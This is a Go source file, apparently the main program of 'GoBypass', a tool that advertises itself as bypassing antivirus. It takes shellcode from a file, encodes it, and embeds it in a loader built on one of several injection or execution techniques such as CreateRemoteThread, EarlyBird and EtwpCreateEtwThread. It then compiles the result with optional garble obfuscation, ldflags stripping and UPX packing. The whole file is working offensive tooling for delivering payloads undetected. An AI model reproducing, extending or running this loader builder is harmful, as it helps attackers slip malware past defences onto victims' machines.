package main

import (
	"flag"
	"fmt"
	"github.com/EmYiQing/GoBypass/build"
	"github.com/EmYiQing/GoBypass/encode"
	"github.com/EmYiQing/GoBypass/log"
	"github.com/EmYiQing/GoBypass/parser"
	"github.com/EmYiQing/GoBypass/tool"
	"strings"
)

const (
	CreateFiber              = "CreateFiber"
	CreateProcess            = "CreateProcess"
	CreateRemoteThread       = "CreateRemoteThread"
	CreateRemoteThreadNative = "CreateRemoteThreadNative"
	CreateThread             = "CreateThread"
	CreateThreadNative       = "CreateThreadNative"
	CryptProtectMemory       = "CryptProtectMemory"
	CryptUnprotectMemory     = "CryptUnprotectMemory"
	EarlyBird                = "EarlyBird"
	EtwpCreateEtwThread      = "EtwpCreateEtwThread"
	HeapAlloc                = "HeapAlloc"
)

func main() {
	printLogo()
	var (
		module    string
		shellcode string
		ldflags   bool
		upx       bool
		garble    bool
		help      bool
	)
	flag.StringVar(&shellcode, "s", "shellcode.txt", "")
	flag.StringVar(&module, "m", "", "")
	flag.BoolVar(&ldflags, "l", false, "")
	flag.BoolVar(&upx, "u", false, "")
	flag.BoolVar(&garble, "g", false, "")
	flag.BoolVar(&help, "h", false, "")
	flag.Parse()
	if help {
		fmt.Println("A Golang Bypass AntiVirus Tool")
		fmt.Println("\nusage: go run main.go -m [MODULE] -u -g")
		fmt.Println("\t-m : use module (default: null)")
		fmt.Println("\t-l : use ldflags (default: false)")
		fmt.Println("\t-u : use upx (default: false)")
		fmt.Println("\t-g : use garble (default: false)")
		fmt.Println("\t-s : shellcode (default: shellcode.txt)")
		fmt.Println("\nmodules:")
		fmt.Println("\t", CreateFiber)
		fmt.Println("\t", CreateProcess)
		fmt.Println("\t", CreateRemoteThread)
		fmt.Println("\t", CreateRemoteThreadNative)
		fmt.Println("\t", CreateThread)
		fmt.Println("\t", CreateThreadNative)
		fmt.Println("\t", CryptProtectMemory)
		fmt.Println("\t", CryptUnprotectMemory)
		fmt.Println("\t", EarlyBird)
		fmt.Println("\t", EtwpCreateEtwThread)
		fmt.Println("\t", HeapAlloc)
		return
	}
	shellcode = parser.ParseShellCode(shellcode)
	shellcode = encode.Encode(shellcode)
	if strings.TrimSpace(module) == "" {
		log.Error("module is null")
		log.Info("see help: go run main.go -h")
		return
	}
	if module != CreateFiber &&
		module != CreateProcess &&
		module != CreateRemoteThread &&
		module != CreateRemoteThreadNative &&
		module != CreateThread &&
		module != CreateThreadNative &&
		module != CryptProtectMemory &&
		module != CryptUnprotectMemory &&
		module != EarlyBird &&
		module != EtwpCreateEtwThread &&
		module != HeapAlloc {
		log.Error("error module")
		log.Info("see help: go run main.go -h")
		return
	}
	code := parser.GetFinalCode(module, shellcode)
	if ldflags && !garble {
		build.AdvanceBuild(code)
	}
	if garble && !ldflags {
		build.NormalGarble(code)
	}
	if garble && ldflags {
		build.AdvanceGarble(code)
	}
	if !garble && !ldflags {
		build.NormalBuild(code)
	}
	if upx {
		tool.StartUpx()
	}
}

func printLogo() {
	fmt.Println("__________                                    \n\\" +
		"______   \\___.__.___________    ______ ______\n |    |  _<   " +
		"|  |\\____ \\__  \\  /  ___//  ___/\n |    |   \\\\___  ||  |_" +
		"> > __ \\_\\___ \\ \\___ \\ \n |______  // ____||   __(____  /" +
		"____  >____  >\n        \\/ \\/     |__|       \\/     \\/    " +
		" \\/ ")
}
